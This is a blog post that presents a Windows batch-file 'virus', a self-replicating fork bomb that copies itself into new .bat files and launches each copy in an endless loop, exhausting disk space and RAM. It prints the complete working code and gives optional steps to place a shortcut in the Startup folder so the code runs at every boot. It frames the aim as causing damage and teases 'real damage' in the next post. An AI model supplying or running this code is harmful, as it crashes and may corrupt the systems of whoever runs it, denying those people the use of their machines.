---
title: Overloading Memory, The thing about machines is that they all have a limit.
path: /overloading-memory
tags:
  - Cyber Security
metaImage: assets/overload.jpeg
featuredImage: ./assets/overload.jpeg
excerpt: This virus combines the best of the fork bomb and the application
  flooder. It creates a new batch file in the same directory and then copies
  itself onto this new file. It then starts this new virus and then both of them
  create another copy of themselves which are then run and the process repeats
  over and over
created: 2020-06-12T03:31:24.963Z
updated: 2020-06-12T03:31:25.033Z
---
This virus combines the best of the [fork bomb](https://blog.leewardslope.com/fork-bomb) and the [application flooder](https://blog.leewardslope.com/application-flooder).

It creates a new batch file in the same directory and then copies itself onto this new file. It then starts this new virus and then both of them create another copy of themselves which are then run and the process repeats over and over and we have an exponential growth in the number of viruses on disk and in memory (RAM).

So let’s have a look:

```powershell
@echo off
:A
set x=%random%
type %0 >> %x%.bat
start %x%.bat
goto:A
```

Depending on what runs out first hard disk space or RAM, the batch file may or may not cause permanent damage. In both cases, however, the computer will almost definitely crash, the operating system may be corrupted and on the next start up, you will be greeted by the well-known “Blue Screen Of Death”. The only way to get rid of it will be to format your hard drive and re-install the operating system.

(Optional) To make this file execute automatically at startup, Do the following. Create a shortcut of the damage.bat file by right clicking on it. Open the start menu, In programs Open Startup folder and simply drag or cut-paste the shortcut into this folder. The virus will break loose the next time the computer is started up.

- - -

These past couple of batch file viruses were, at best, annoying. Now let’s do some real damage. Next up, we’re going to be [wiping out memory](https://blog.leewardslope.com/wiping-out-memory).